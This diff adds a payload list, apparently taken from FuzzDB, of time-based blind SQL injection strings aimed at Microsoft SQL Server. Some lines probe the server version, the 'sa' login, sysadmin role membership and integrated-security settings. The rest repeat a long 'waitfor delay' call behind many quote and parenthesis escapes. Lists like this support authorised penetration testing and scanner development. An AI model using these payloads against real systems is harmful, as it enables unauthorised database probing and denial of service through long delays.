@@ -1,0 +1,52 @@
+# Source: FuzzDB (https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/payloads-sql-blind)
+# Origin source: http://funoverip.net/2010/12/blind-sql-injection-detection-with-burp-suite/
+
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:200000' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:200000' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:200000' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:200000' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:200000' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:200000' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:200000' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:200000' --
+
+ waitfor delay '0:0:200000' /* 
+ waitfor delay '0:0:200000' --
+' waitfor delay '0:0:200000' /* 
+' waitfor delay '0:0:200000' --
+" waitfor delay '0:0:200000' /* 
+" waitfor delay '0:0:200000' --
+) waitfor delay '0:0:200000' /* 
+) waitfor delay '0:0:200000' --
+)) waitfor delay '0:0:200000' /* 
+)) waitfor delay '0:0:200000' --
+))) waitfor delay '0:0:200000' /* 
+))) waitfor delay '0:0:200000' --
+)))) waitfor delay '0:0:200000' /* 
+)))) waitfor delay '0:0:200000' --
+))))) waitfor delay '0:0:200000' --
+)))))) waitfor delay '0:0:200000' --
+') waitfor delay '0:0:200000' /* 
+') waitfor delay '0:0:200000' --
+") waitfor delay '0:0:200000' /* 
+") waitfor delay '0:0:200000' --
+')) waitfor delay '0:0:200000' /* 
+')) waitfor delay '0:0:200000' --
+")) waitfor delay '0:0:200000' /* 
+")) waitfor delay '0:0:200000' --
+'))) waitfor delay '0:0:200000' /* 
+'))) waitfor delay '0:0:200000' --
+"))) waitfor delay '0:0:200000' /* 
+"))) waitfor delay '0:0:200000' --
+')))) waitfor delay '0:0:200000' /* 
+')))) waitfor delay '0:0:200000' --
+")))) waitfor delay '0:0:200000' /* 
+")))) waitfor delay '0:0:200000' --
+'))))) waitfor delay '0:0:200000' /* 
+'))))) waitfor delay '0:0:200000' --
+"))))) waitfor delay '0:0:200000' /* 
+"))))) waitfor delay '0:0:200000' --
+')))))) waitfor delay '0:0:200000' /* 
+')))))) waitfor delay '0:0:200000' --
+")))))) waitfor delay '0:0:200000' /* 
+")))))) waitfor delay '0:0:200000' --
